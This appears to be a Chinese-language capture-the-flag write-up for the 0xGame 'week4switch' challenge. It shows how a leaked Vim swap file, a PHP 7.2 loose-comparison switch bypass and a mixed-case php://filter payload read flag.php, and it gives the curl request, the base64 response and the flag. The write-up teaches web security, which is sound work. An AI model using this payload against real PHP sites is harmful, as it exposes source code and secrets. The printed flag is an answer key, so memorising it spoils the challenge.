# week4switch

## 题目简述

站点泄露了 Vim 异常退出产生的 `.index.php.swp`，可据此恢复 PHP 源码。程序在 `if` 和 `switch` 中以不同类型比较同一个 `id`，在题目的 PHP 7.2 环境中可用非纯数字字符串绕过前置拦截、进入 `case 2`；随后再利用正则区分大小写而 PHP 伪协议名称不区分大小写的差异，读取 `flag.php`。

## 解题过程

下载 `.index.php.swp` 后可用 Vim 恢复缓冲区：

```text
vim -r .index.php.swp
```

仓库中也保留了对应源码，其核心逻辑为：

```php
$id = $_POST['id'] ? $_POST['id'] : 0;
$file = $_POST['file'] ? $_POST['file'] : "";

if ($id == '2') {
    die("no no no !");
}

switch ($id) {
    case 0:
        die("...");
    case 1:
        die("0xGame Good!");
    case 2:
        if (preg_match('/filter|base64/', $file)) {
            die("hacker");
        }
        include($file);
}
```

提交 `id=2a` 时，`$id` 与字符串 `'2'` 比较为假，所以不会进入前面的 `die()`；而 PHP 7.2 的 `switch` 使用宽松比较，将字符串 `2a` 与整数分支值 `2` 比较时按数字前缀转换，从而命中 `case 2`。这是旧版 PHP 的类型转换行为，不能直接套用到 PHP 8。

`preg_match('/filter|base64/', $file)` 没有 `i` 修饰符，只拦截全小写单词。PHP 的 `php://filter` 包装器和过滤器名称对大小写不敏感，因此可混合大小写绕过：

```text
id=2a&file=php://filtEr/read=convert.basE64-encode/resource=flag.php
```

例如使用 POST 请求：

```text
curl -s -X POST "http://<TARGET>/" \
  --data-urlencode "id=2a" \
  --data-urlencode "file=php://filtEr/read=convert.basE64-encode/resource=flag.php"
```

响应中的 Base64 数据为：

```text
PD9waHANCiRmbGFnPScweEdhbWV7UzBtZV9wSHBfdFIxY0tzX3VfRzN0XzF0fSc7
```

解码后得到 `flag.php` 源码及 flag：

```php
<?php
$flag='0xGame{S0me_pHp_tR1cKs_u_G3t_1t}';
```

## 方法总结

本题串联了三处信息：Vim 交换文件泄露源码、PHP 7.2 在字符串比较与 `switch` 整数分支中的宽松转换差异、大小写敏感正则与大小写不敏感 PHP 包装器之间的差异。稳定 payload 应统一使用同一个可验证的 `id=2a`，并写出完整的 `read=convert.base64-encode` 过滤器链，避免原稿前后使用不同参数。
